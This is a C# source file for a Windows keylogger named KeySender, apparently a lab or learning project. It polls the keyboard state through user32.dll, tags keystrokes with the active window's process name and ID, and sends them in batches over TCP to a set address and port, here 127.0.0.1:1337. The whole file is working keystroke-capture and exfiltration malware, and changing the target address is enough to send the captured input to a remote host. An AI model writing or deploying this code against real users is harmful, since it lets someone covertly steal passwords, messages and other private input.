using System;
using System.IO;
using System.Diagnostics;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Text;

class KeySender
{
    // import api functions
    //[System.Runtime.InteropServices.DllImport("user32.dll")]
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")]
    public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
    [DllImport("user32.dll")]
    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    static void Main()
    {
        string targetAddress = "127.0.0.1";
        int targetPort = 1337;
        string lastWindow = "";
        DateTime lastWindowChangeLogged = DateTime.Now;
        TimeSpan windowChangeThrottle = TimeSpan.FromMilliseconds(500);

        Console.WriteLine($"Sending to {targetAddress}:{targetPort}");
        
        IPEndPoint remoteEndPoint = new IPEndPoint(IPAddress.Parse(targetAddress), targetPort);

        using (TcpClient tcpClient = new TcpClient())
        {
            try
            {
                tcpClient.Connect(targetAddress, targetPort);
                Console.WriteLine("Connected to the server.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error connecting: " + ex.Message);
                return;
            }

            NetworkStream stream = tcpClient.GetStream();

            List<string> batchKeys = new List<string>();
            DateTime lastSentTime = DateTime.Now;

            while (true)
            {
                Thread.Sleep(5);  // prevent excessive CPU usage

                IntPtr activeWindow = GetForegroundWindow();
                string currentWindow = GetActiveWindowProcess(activeWindow);

                // detect changing windows
                if (currentWindow != lastWindow && (DateTime.Now - lastWindowChangeLogged) >= windowChangeThrottle)
                {
                    lastWindow = currentWindow;
                    lastWindowChangeLogged = DateTime.Now;
                    batchKeys.Add("\n[Window: " + currentWindow + "]");
                }

                // capture strokes
                for (int key = 1; key < 255; key++)
                {
                    int keyState = GetAsyncKeyState(key);
                    // value -32767 indicates that the key was pressed since the last call
                    if (keyState == -32767)
                    {
                        string keyLog = ((Keys)key).ToString();
                        batchKeys.Add(keyLog);
                    }
                }

                const int MaxPacketSize = 512;

                if (batchKeys.Count > 0)
                {
                    string message = string.Join(",", batchKeys);
                    int messageByteSize = Encoding.UTF8.GetByteCount(message);
                    
                    if (messageByteSize > MaxPacketSize || (DateTime.Now - lastSentTime).TotalMilliseconds >= 100)
                    {
                        byte[] data = Encoding.UTF8.GetBytes(message);

                        try
                        {
                            stream.Write(data, 0, data.Length);
                            Console.WriteLine($"Sent: {message}");
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Error sending data: " + ex.Message);
                            break; // optionally, handle reconnection here.
                        }
                        
                        // clear the batch and reset the timer
                        batchKeys.Clear();
                        lastSentTime = DateTime.Now;
                    }
                }


            }
        }
    }

    // get currently active program
    static string GetActiveWindowProcess(IntPtr hwnd)
    {
        uint processId;
        GetWindowThreadProcessId(hwnd, out processId);

        try
        {
            Process process = Process.GetProcessById((int)processId);
            return process.ProcessName + "(" + processId + ")";
        }
        catch
        {
            return "Unknown PID";
        }
    }
}
